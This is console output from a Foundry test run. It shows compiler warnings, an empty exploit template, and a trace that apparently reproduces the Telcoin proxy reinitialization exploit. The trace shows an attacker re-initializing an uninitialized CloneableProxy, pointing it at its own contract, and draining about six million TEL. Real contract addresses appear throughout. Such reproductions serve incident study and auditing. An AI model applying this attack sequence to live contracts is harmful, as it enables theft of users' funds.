Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.21s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 290.62ms (173.11µs CPU time)

Ran 1 test for src/test/2023-12/Telcoin_exp.sol:ContractTest
[PASS] testExploit() (gas: 89350)
Logs:
  Attacker TEL balance before exploit: 0.00
  ----------------------------------------------------------------
  CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization: 0xa260d3506d4bae68003000240001000000000000000001000040001000000000
  ----------------------------------------------------------------
  CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: 0, bool _initialized: 0
  ----------------------------------------------------------------
  ---Exploit Time---
  ----------------------------------------------------------------
  CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization: 0xa260d3506d4bae68003000240001000000000000000001000040001000000001
  ----------------------------------------------------------------
  CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization (two least significant bytes): uint8 _initializing: 0, bool _initialized: 1
  ----------------------------------------------------------------
  Attacker TEL balance after exploit: 6018296.75

Traces:
  [94150] ContractTest::testExploit()
    ├─ [7940] TEL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2586] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [3276] TEL::decimals() [staticcall]
    │   ├─ [2428] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::decimals() [delegatecall]
    │   │   └─ ← [Return] 2
    │   └─ ← [Return] 2
    ├─ emit log_named_decimal_uint(key: "Attacker TEL balance before exploit", val: 0, decimals: 2)
    ├─ [0] VM::load(CloneableProxy#1: [0x56BCADff30680EBB540a84D75c182A5dC61981C0], 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] 0xa260d3506d4bae68003000240001000000000000000001000040001000000000
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ emit log_named_bytes32(key: "CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization", val: 0xa260d3506d4bae68003000240001000000000000000001000040001000000000)
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("CloneableProxy#1 storage packed slot 0 contents before exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s", 0, 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("---Exploit Time---") [staticcall]
    │   └─ ← [Stop] 
    ├─ [49561] CloneableProxy#1::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xed92c6c4)
    │   ├─ [46874] 0x10d0E9755C67Ab37089aCb4f51E8b4eE407FE853::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0xed92c6c4) [delegatecall]
    │   │   ├─ [221] ContractTest::implementation() [staticcall]
    │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   ├─ emit BeaconUpgraded(param0: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   ├─ [221] ContractTest::implementation() [staticcall]
    │   │   │   └─ ← [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    │   │   ├─ [31624] ContractTest::transferTELFromCloneableProxy() [delegatecall]
    │   │   │   ├─ [3440] TEL::balanceOf(CloneableProxy#1: [0x56BCADff30680EBB540a84D75c182A5dC61981C0]) [staticcall]
    │   │   │   │   ├─ [2586] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::balanceOf(CloneableProxy#1: [0x56BCADff30680EBB540a84D75c182A5dC61981C0]) [delegatecall]
    │   │   │   │   │   └─ ← [Return] 601829675 [6.018e8]
    │   │   │   │   └─ ← [Return] 601829675 [6.018e8]
    │   │   │   ├─ [27176] TEL::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 601829675 [6.018e8])
    │   │   │   │   ├─ [26316] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 601829675 [6.018e8]) [delegatecall]
    │   │   │   │   │   ├─ emit Transfer(from: CloneableProxy#1: [0x56BCADff30680EBB540a84D75c182A5dC61981C0], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 601829675 [6.018e8])
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [0] VM::load(CloneableProxy#1: [0x56BCADff30680EBB540a84D75c182A5dC61981C0], 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← [Return] 0xa260d3506d4bae68003000240001000000000000000001000040001000000001
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ emit log_named_bytes32(key: "CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization", val: 0xa260d3506d4bae68003000240001000000000000000001000040001000000001)
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("CloneableProxy#1 storage packed slot 0 contents after exploit and reinitialization (two least significant bytes): uint8 _initializing: %s, bool _initialized: %s", 0, 1) [staticcall]
    │   └─ ← [Stop] 
    ├─ [0] console::log("----------------------------------------------------------------") [staticcall]
    │   └─ ← [Stop] 
    ├─ [1440] TEL::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [586] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 601829675 [6.018e8]
    │   └─ ← [Return] 601829675 [6.018e8]
    ├─ [1276] TEL::decimals() [staticcall]
    │   ├─ [428] 0x805b70339183f9A98cC7fcB35fCbeb5Ac10713EA::decimals() [delegatecall]
    │   │   └─ ← [Return] 2
    │   └─ ← [Return] 2
    ├─ emit log_named_decimal_uint(key: "Attacker TEL balance after exploit", val: 601829675 [6.018e8], decimals: 2)
    ├─ [0] VM::expectRevert(Initializable: contract is already initialized)
    │   └─ ← [Return] 
    ├─ [1970] CloneableProxy#1::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [1772] 0x10d0E9755C67Ab37089aCb4f51E8b4eE407FE853::initialize(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x) [delegatecall]
    │   │   └─ ← [Revert] revert: Initializable: contract is already initialized
    │   └─ ← [Revert] revert: Initializable: contract is already initialized
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 384.27ms (1.17ms CPU time)

Ran 2 test suites in 385.72ms (674.89ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
